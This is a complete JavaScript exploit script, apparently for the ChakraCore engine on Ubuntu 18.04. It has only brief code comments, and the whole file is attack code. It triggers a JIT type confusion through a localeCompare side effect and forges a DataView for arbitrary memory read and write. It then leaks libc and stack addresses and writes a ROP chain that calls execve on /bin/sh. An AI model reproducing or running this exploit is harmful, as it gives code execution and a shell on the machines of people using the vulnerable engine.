//test in ubuntu 18.04
var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
var f64 = new Float64Array(1);
var i32 = new Int32Array(f64.buffer);
var array_addr_hi, array_addr_lo;
var dv;

// Uint32 to Int32
function u32_to_i32(x) {
    if (x >= 0x80000000) {
        return -(0x100000000 - x);
    }
    return x;
}

// Int32 to Uint32
function i32_to_u32(x) {
    return x >>> 0;
}

function print64(int64_value, message){
    print(message + '0x'+ i32_to_u32(int64_value.hi).toString(16) + i32_to_u32(int64_value.lo).toString(16));
}

function write32(addr_hi, addr_lo, value) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    DataView.prototype.setInt32.call(dv, 0, value, true);
}

function read32(addr_hi, addr_lo) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    return DataView.prototype.getInt32.call(dv, 0, true);
}

function read64(addr_hi, addr_low) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + 4);
    return {hi : higher_dword, lo : lower_dword };
}

function opt(arr, s, oarr, obj) {
    arr[0] = 1.1;
    if (s !== null) {
        let tmp = 'a'.localeCompare(s);
    }
    arr[0] = 2.3023e-320;
	//the exploit start from here
  	oarr[2] = obj;
    let addr = arr[2];

    // for now, f64[0] point to the start address of the fake_object
    f64[0] = addr;
    let base_lo = i32[0], base_hi = i32[1];
    // Corrupt the element to point to fake_object's data
    i32[0] = base_lo + 0x58;
    // now arr[0] is a fake pointer point to the faked dataview obj
    arr[0] = f64[0];

    // Construct our fake DataView
    // vtable
    fake_object[0] = base_lo + 0x58 - 0xb0 + 0x20;  fake_object[1] = base_hi;
    // Type*
    fake_object[2] = base_lo + 0x68;         fake_object[3] = base_hi;
    // (TypeId for fake Type object)
    fake_object[4] = 58;                     fake_object[5] = 0;
    // (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
    fake_object[6] = base_lo + 0x58 - 0x430; fake_object[7] = base_hi;
    // Buffer size
    fake_object[8] = 0x200;                  fake_object[9] = 0;
    // ArrayBuffer pointer, +0x3C IsDetached
    fake_object[10] = base_lo + 0x58 - 0x20 + 20; fake_object[11] = base_hi;
    // Buffer address
    fake_object[14] = base_lo + 0x58;        fake_object[15] = base_hi;

    array_addr_hi = i32_to_u32(base_hi);
    array_addr_lo = i32_to_u32(base_lo);
}


function main() {
    let arr = [1.1, 2.2, 3.3];
    let oarr = [1.1, 2.2, 3.3, {}];

    for (let i = 0; i < 100; i++) {
        'a'.localeCompare('x', []);  // Optimize the JavaScript localeCompare
        opt(arr, null, oarr, {});  // for profiling all instructions in opt.
        try {
            opt(arr, {toString: () => {
                throw 1;  // Don't profile "if (locales === undefined && options === undefined) {"
            }}, oarr, {});
        } catch (e) {
        }
    }

    let addr = opt(arr, {toString: () => {
        // Called twice
        arr[0] = {};
    }}, arr, fake_object);

	// now we
    var leak_int64 = {hi : array_addr_hi, lo : array_addr_lo};
    print64(leak_int64, "array @ ");

    //our fake dv obj
    dv = arr[0];

    //calculate some address in the libc
    var vtable_leak = read64(array_addr_hi, array_addr_lo);
    print64(vtable_leak, "vtable @ ");

    var so_base = vtable_leak;
    so_base.lo -= 0xdd7e08;
    print64(so_base, "so_base @ ");

    var memmove_got = so_base;
    memmove_got.lo += 0x000000e21108;
    print64(memmove_got, "memmove_got @ ");

	  var free_got = memmove_got;
    free_got.lo += 0x20;
    var free_libc = read64(free_got.hi, free_got.lo);
    print64(free_libc, "libc_free @ ");
    var libc_base = free_libc;
    libc_base.lo = libc_base.lo - 620880;
    print64(libc_base, "libc_base @ ");

	  //gadgets
    var execve_libc = {hi : libc_base.hi, lo : libc_base.lo};
    var pop_rdi = {hi : libc_base.hi, lo : libc_base.lo};
    var pop_rsi = {hi : libc_base.hi, lo : libc_base.lo};
    var pop_rdx = {hi : libc_base.hi, lo : libc_base.lo};
    execve_libc.lo += 937520;
    pop_rdi.lo += 0x2155f;
    pop_rsi.lo += 0x23e6a;
    pop_rdx.lo += 0x1b96;

    //"/bin/sh" addr
    write32(array_addr_hi, array_addr_lo + 0x58 + 0x24, 0x0068732f);
    write32(array_addr_hi, array_addr_lo + 0x58 + 0x20, 0x6e69622f);

  	//environ
    var environ = libc_base;
    environ.lo += 4120728;
    //print64(environ, "environ @ ");

    //stack addr
    var stack_addr = read64(environ.hi, environ.lo);
    //print64(stack_addr, "stack_addr @ ");

    //rsp addr
    var rsp_value = stack_addr;
    rsp_value.lo -= 0xb68;
    //print64(rsp_value, "rsp @ ");

 	//write rop chain
    String.prototype.slice.call('', { valueOf : () => { // This will overwrite a return address from a
                                                     // code path related to slice()
                                                     print("hello world");
                                                     write32(rsp_value.hi, rsp_value.lo, pop_rdi.lo);
                                                     write32(rsp_value.hi, rsp_value.lo + 4, pop_rdi.hi);
                                                     write32(rsp_value.hi, rsp_value.lo + 8, array_addr_lo + 0x58 + 0x20);
                                                     write32(rsp_value.hi, rsp_value.lo + 12, array_addr_hi);
                                                     write32(rsp_value.hi, rsp_value.lo + 16, pop_rsi.lo);
                                                     write32(rsp_value.hi, rsp_value.lo + 20, pop_rsi.hi);
                                                     write32(rsp_value.hi, rsp_value.lo + 24, 0);
                                                     write32(rsp_value.hi, rsp_value.lo + 28, 0);
                                                     write32(rsp_value.hi, rsp_value.lo + 32, pop_rdx.lo);
                                                     write32(rsp_value.hi, rsp_value.lo + 36, pop_rdx.hi);
                                                     write32(rsp_value.hi, rsp_value.lo + 40, 0);
                                                     write32(rsp_value.hi, rsp_value.lo + 44, 0);
                                                     write32(rsp_value.hi, rsp_value.lo + 48, execve_libc.lo);
                                                     write32(rsp_value.hi, rsp_value.lo + 52, execve_libc.hi);
                                                   }});

}

main();
